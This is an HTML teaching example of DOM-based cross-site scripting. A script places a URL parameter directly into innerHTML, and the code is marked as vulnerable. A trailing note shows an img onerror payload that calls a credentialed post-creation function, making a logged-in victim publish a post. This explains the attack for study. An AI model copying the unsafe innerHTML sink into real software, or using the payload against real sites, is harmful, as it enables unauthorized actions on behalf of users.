<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>XSS Example</title>
</head>

<body>
    <!-- Vulnerable Code -->
    <div>
        Welcome, <span id="username"></span>! TimeZone,
        <span id="timezone"></span>!
    </div>
    
    <!-- Vulnerable Code -->
    <script>
        const params = new URLSearchParams(window.location.search);
        const name = params.get("name");
        document.getElementById("username").innerHTML = name;
    </script>

    <script>
        // Example: Function to create a post in social media
        function createPost(title, description) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", '/post', true);
            console.log(document.cookie);
            xhr.withCredentials = true;
            xhr.setRequestHeader(
                "Content-type",
                "application/x-www-form-urlencoded"
            );
            xhr.send(`txtName=${title}&mtxMessage=${description}`);
        }
    </script>
    Cross-site scripting(XSS)
</body>

</html>


// Suppose this is above code. Which has a http call method to for creating a post in social-media.


- Injected code in urlParam: 
<img src='error.gif' onerror="createPost('HACK_TITLE','HACK_DESCRIPTION');"/>

- So, when this executes and user is logged-in it will create a post with given title and description from user-behalf.


